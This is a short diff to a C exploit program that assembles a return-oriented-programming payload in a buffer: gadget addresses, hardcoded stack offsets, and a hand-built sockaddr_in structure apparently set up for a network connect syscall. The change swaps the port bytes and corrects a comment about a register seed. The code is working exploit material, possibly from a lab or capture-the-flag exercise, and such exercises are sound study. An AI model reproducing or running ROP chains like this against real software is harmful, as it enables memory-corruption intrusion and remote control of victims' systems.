@@ -61,7 +61,7 @@ int main(void)
   // info.ip_addr = "\x01\x01\x01\x01" filler value, should be 0x0100007f before syscall
   // info.filler2 = "\x01\x01\x01\x01\x01\x01\x01\x01"
 
-  char sockaddr_in[] = "\x01\x02\x39\x30\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
+  char sockaddr_in[] = "\x01\x02\x30\x39\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
   char sockaddr_in_addr[] = "\x28\x68\xbf\xbf"; // buf + 267
 
   char con_arg_16_seed[] = "\x10\x11\x11\x11";
@@ -153,7 +153,7 @@ int main(void)
   // write value of 3 to where ecx points to
   strcpy(bufr + 319, write_at_ecx_from_edx); // 0xbbb6b87e
                                             // 0x should have 0x3
-  // use seed to put 0xf0 into eax
+  // use seed to put 0x10 into eax
   // pop seed into edx
   strcpy(bufr + 323, pop_edx); // 0xbbb9dc1b
   strcpy(bufr + 327, con_arg_16_seed);
